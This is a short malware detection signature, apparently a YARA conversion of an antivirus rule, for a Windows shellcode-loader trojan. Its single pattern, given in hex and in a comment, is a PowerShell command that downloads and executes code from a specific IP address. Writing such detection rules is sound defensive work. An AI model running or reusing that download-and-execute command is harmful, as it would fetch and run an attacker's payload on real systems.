
rule Trojan_Win64_ShellcodeLoader_PGSE_MTB{
	meta:
		description = "Trojan:Win64/ShellcodeLoader.PGSE!MTB,SIGNATURE_TYPE_PEHSTR_EXT,05 00 05 00 01 00 00 "
		
	strings :
		$a_80_0 = {70 6f 77 65 72 73 68 65 6c 6c 20 2d 63 20 22 69 65 78 28 69 77 72 20 2d 55 72 69 20 27 39 31 2e 39 32 2e 32 34 30 2e 32 31 39 27 20 2d 55 73 65 42 61 73 69 63 50 61 72 73 69 6e 67 29 } //powershell -c "iex(iwr -Uri '91.92.240.219' -UseBasicParsing)  5
	condition:
		((#a_80_0  & 1)*5) >=5
 
}